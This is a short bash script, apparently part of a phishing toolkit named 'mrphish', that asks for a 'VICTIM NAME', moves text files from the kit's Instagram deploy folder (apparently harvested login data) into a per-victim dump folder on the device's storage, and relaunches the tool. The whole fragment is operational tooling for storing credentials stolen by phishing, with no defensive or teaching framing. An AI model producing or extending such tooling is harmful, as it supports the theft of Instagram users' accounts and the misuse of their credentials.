echo -e "\e[96m | "
read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] VICTIM NAME: \e[0m' name
cd /sdcard/dUmpS
mkdir $name
cd $HOME/mrphish/core/deploys/instagram
mv *.txt /sdcard/dUmpS/$name 
cp grad.sh /sdcard/dUmpS/$name
sleep 2.3
echo -e "\e[96m | "
printf " \e[1;92m\e[0m\e[1;96m|------------------[\e[92mDONE\e[96m]\e[0m\n"
cd $HOME/mrphish
bash mrphish 
